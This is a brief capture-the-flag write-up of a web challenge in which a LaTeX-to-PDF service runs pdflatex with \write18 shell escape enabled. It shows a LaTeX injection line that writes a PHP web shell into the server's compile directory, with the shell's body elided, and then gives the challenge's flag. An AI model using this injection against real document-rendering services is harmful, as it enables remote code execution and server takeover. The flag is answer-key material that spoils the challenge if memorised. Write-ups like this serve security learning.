### Solved by Swappage

This 90 points web challenge was a webUI to generate PDF documents from LateX source.
We were allowed to submit LateX source code, and the web application would provide us a PDF to download.

by a quick look at the debug log at the bottom of the page and by googling a bit we could easly figure out that the web application was invoking the **pdflatex** command line tool to generate the output.

    LOG:
    This is pdfTeX, Version 3.14159265-2.6-1.40.15 (TeX Live 2015/dev/Debian) (preloaded format=pdflatex)

by a quick look at the command line help we can also notice

    [-no]-shell-escape      disable/enable \write18{SHELL COMMAND}

And again, appearently it looks like that *\write18* was enabled in the web application.

This means we can execute shell commands in the server.

We quickly generated a payload that would drop a php shell on the server in the **compile** directory which was writeable by the php scripts and gained access to the server.

    \immediate\write18{echo '<?php .... ?>' >  /var/www/texmaker.ctf.internetwache.org/compile/swappage.php }


The flag was stored in a php script in the web root:

```php
<php
$FLAG = "IW{L4T3x_IS_Tur1ng_c0mpl3te}";
?>
```

the flag is: **IW{L4T3x_IS_Tur1ng_c0mpl3te}**
